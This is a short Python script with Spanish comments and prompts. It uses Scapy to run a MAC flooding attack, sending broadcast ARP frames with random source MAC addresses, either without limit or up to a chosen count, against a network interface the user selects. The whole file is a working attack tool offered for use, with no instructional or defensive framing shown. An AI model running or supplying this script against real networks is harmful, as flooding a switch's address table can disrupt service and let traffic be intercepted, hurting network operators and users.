#!/usr/bin/env python3
import random
import time
from scapy.all import Ether, ARP, sendp, conf

def main():
    print("\n=== MAC FLOODING (versión corregida) ===\n")
    
    iface = input("Interfaz (ej: eth0): ").strip()
    if not iface:
        print("Error: interfaz requerida")
        return
    
    try:
        num_frames = int(input("Número de tramas (0 = infinito): "))
    except:
        num_frames = 0
    
    try:
        delay = float(input("Retardo (segundos, 0 = máximo): "))
    except:
        delay = 0.0
    
    conf.iface = iface
    print("\nEnviando tramas ARP con MACs aleatorias...\n")
    
    count = 0
    try:
        while True:
            # Generar MAC origen aleatoria
            src_mac = "02:%02x:%02x:%02x:%02x:%02x" % tuple(random.randint(0,255) for _ in range(5))
            # Construir trama ARP (payload válido)
            pkt = Ether(src=src_mac, dst="ff:ff:ff:ff:ff:ff") / ARP(op=1, hwsrc=src_mac, psrc="0.0.0.0", hwdst="ff:ff:ff:ff:ff:ff", pdst="0.0.0.0")
            sendp(pkt, iface=iface, verbose=False)
            count += 1
            if count % 100 == 0:
                print(f"Enviadas {count} tramas (última MAC: {src_mac})")
            if 0 < num_frames <= count:
                break
            if delay > 0:
                time.sleep(delay)
    except KeyboardInterrupt:
        print(f"\nDetenido. Total enviado: {count}")

if __name__ == "__main__":
    main()
          
